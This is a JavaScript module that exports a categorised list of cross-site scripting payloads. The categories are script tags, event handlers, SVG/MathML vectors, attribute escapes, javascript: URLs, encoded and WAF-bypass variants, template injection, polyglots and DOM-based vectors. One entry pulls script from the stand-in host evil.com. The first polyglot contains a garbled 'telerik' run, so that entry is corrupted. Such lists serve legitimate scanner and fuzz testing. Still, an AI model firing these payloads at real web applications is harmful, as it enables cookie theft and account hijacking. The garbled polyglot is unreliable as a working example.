// — Script tags —
const SCRIPT_TAGS = [
  "<script>alert(1)</script>",
  "<SCRIPT>alert(1)</SCRIPT>",
  "<script src=//evil.com></script>",
  "<script/src=data:,alert(1)>",
  "<script>alert`1`</script>",
  "<script>confirm(1)</script>",
];

// — Event handlers —
const EVENT_HANDLERS = [
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  "<input onfocus=alert(1) autofocus>",
  "<marquee onstart=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video src=x onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",
];

// — SVG / MathML —
const SVG_MATHML = [
  "<svg><script>alert(1)</script></svg>",
  "<svg><animate onbegin=alert(1) attributeName=x>",
  "<svg><set onbegin=alert(1) attributeName=x>",
  "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click",
  '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',
];

// — Attribute escapes —
const ATTRIBUTE_ESCAPES = [
  '" onmouseover="alert(1)"',
  "' onmouseover='alert(1)'",
  '" onfocus="alert(1)" autofocus="',
  "'><script>alert(1)</script>",
  '"><script>alert(1)</script>',
  '" onmouseover="alert(1)" "',
];

// — javascript: protocol —
const JAVASCRIPT_PROTOCOL = [
  "javascript:alert(1)",
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)">',
  "javascript:alert(document.cookie)",
  "<a href=javascript:void(0) onclick=alert(1)>click</a>",
];

// — Encoded variants —
const ENCODED_VARIANTS = [
  "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
  "<scr%00ipt>alert(1)</scr%00ipt>",
  "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
  "<script>alert(String.fromCharCode(88,83,83))</script>",
];

// — WAF bypass —
const WAF_BYPASS = [
  "<img/src=x onerror=alert(1)>",
  "<script>alert(1)//",
  "<ScRiPt>alert(1)</ScRiPt>",
  "<script>al\\u0065rt(1)</script>",
  "<img src=x onerror=alert&lpar;1&rpar;>",
  "<script>window['alert'](1)</script>",
  "<img src=x onerror=`alert(1)`>",
  "<svg/onload=alert(1)>",
];

// — Template injection —
const TEMPLATE_INJECTION = [
  "{{constructor.constructor('return alert(1)')()}}",
  "${alert(1)}",
  "<%= alert(1) %>",
  "{{7*7}}",
];

// — Polyglot —
const POLYGLOT = [
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik//oNlOaD=alert()//><svg/onload=alert()//>",
  "'\"><img src=x onerror=alert(1)>",
  "'-alert(1)-'",
  "'/><script>alert(1)</script>",
  '<img src="x`>`>" onerror=alert(1)>',
];

// — DOM-based —
const DOM_BASED = [
  "<img src=x onerror=alert(document.domain)>",
  "#<script>alert(1)</script>",
  '<input type=text value="" onfocus=alert(1) autofocus>',
];

export const XSS_PAYLOADS = [
  ...SCRIPT_TAGS,
  ...EVENT_HANDLERS,
  ...SVG_MATHML,
  ...ATTRIBUTE_ESCAPES,
  ...JAVASCRIPT_PROTOCOL,
  ...ENCODED_VARIANTS,
  ...WAF_BYPASS,
  ...TEMPLATE_INJECTION,
  ...POLYGLOT,
  ...DOM_BASED,
];
